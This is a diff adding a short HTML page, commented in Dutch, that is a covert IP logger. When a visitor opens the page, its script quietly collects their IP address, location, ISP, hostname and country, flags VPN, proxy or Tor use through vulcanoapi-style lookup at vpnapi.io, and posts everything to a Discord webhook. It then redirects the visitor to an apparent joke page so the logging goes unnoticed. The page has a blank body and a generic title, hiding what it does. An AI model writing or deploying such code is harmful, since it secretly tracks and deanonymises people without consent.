@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>page</title>
+    <script>
+        async function getIPAddress() {
+            try {
+                let response = await fetch('https://myip.wtf/json');
+                let ipData = await response.json();
+                
+                let proxyResponse = await fetch(`https://vpnapi.io/api/${ipData.YourFuckingIPAddress}?key=YOUR_API_KEY_FOR_VPNAPI.IO`);
+                let proxyData = await proxyResponse.json();
+                
+                let gebruiktProxy = proxyData.security.vpn || 
+                                  proxyData.security.proxy || 
+                                  proxyData.security.tor || 
+                                  proxyData.security.relay;
+                
+                let bericht = gebruiktProxy ? "De gebruiker gebruikt mogelijk een Proxy/VPN" : "De gebruiker gebruikt waarschijnlijk geen Proxy";
+
+                const combinedData = {
+                    ip: ipData.YourFuckingIPAddress,
+                    locatie: ipData.YourFuckingLocation,
+                    provider: ipData.YourFuckingISP,
+                    hostname: ipData.YourFuckingHostname,
+                    land: ipData.YourFuckingCountry
+                };
+
+                await sendToDiscord(bericht, combinedData);
+                window.location.href = "https://vulcanoroll.pages.dev/";
+
+            } catch (error) {
+                window.location.href = "https://vulcanoroll.pages.dev/";
+            }
+        }
+
+        async function sendToDiscord(bericht, ipData) {
+            const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+            
+            const relevantData = {
+                ip: ipData.ip,
+                locatie: ipData.locatie,
+                provider: ipData.provider,
+                hostname: ipData.hostname,
+                land: ipData.land
+            };
+
+            const formattedData = Object.entries(relevantData)
+                .map(([key, value]) => `**${key}**: ${value}`)
+                .join("\n");
+
+            let data = {
+                content: `📡 **Nieuw IP-log ontvangen**\n\n${formattedData}\n\n${bericht}`
+            };
+
+            try {
+                let response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+            }
+        }
+    </script>
+</head>
+<body onload="getIPAddress()">
+
+</body>
+</html>
